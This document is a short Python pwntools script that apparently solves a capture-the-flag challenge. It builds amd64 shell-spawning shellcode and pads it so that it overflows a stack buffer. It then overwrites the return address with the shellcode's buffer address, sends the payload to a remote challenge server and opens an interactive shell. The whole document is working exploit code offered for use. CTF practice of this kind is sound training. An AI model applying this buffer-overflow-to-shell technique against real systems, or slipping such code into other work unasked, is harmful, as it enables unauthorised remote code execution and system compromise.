from pwn import *
elf=ELF('./shellcode')
context(os="linux",arch="amd64",log_level="debug")
p=remote('node5.anna.nssctf.cn',27942)
buff_addr=0x4040A0
shellcode=asm(shellcraft.amd64.sh())


payload=shellcode.ljust(0x100+0x8,b'a')+p64(buff_addr)
p.sendline(payload)
p.interactive()